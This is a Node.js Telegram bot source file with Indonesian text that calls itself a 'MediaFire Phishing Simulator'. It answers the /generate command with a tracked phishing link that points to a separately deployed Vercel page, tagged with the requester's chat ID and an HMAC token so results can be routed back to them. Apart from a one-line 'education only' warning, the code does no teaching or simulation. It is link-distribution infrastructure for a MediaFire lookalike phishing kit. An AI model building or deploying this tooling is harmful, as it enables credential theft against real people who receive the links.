const TelegramBot = require('node-telegram-bot-api');
const crypto = require('crypto');
require('dotenv').config();

const token = process.env.TELEGRAM_BOT_TOKEN;
const bot = new TelegramBot(token, {polling: true});
const PHISHING_URL = process.env.PHISHING_URL; // URL Vercel Anda

function generateToken(chatId) {
  const hmac = crypto.createHmac('sha256', process.env.SECRET_KEY);
  hmac.update(chatId.toString());
  return hmac.digest('hex').slice(0, 12);
}

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(
    chatId,
    `🔒 MediaFire Phishing Simulator\n\nGunakan perintah /generate untuk membuat link phishing edukasi.`
  );
});

bot.onText(/\/generate/, (msg) => {
  const chatId = msg.chat.id;
  const token = generateToken(chatId);
  const uniqueUrl = `${PHISHING_URL}/?chat_id=${chatId}&token=${token}`;
  
  bot.sendMessage(
    chatId,
    `🔗 Phishing Link Created\n\n` +
    `Berikut link untuk edukasi keamanan digital:\n` +
    `${uniqueUrl}\n\n` +
    `PERINGATAN: Ini hanya untuk tujuan edukasi. Jangan disalahgunakan!`
  );
});

console.log("Bot Telegram started...");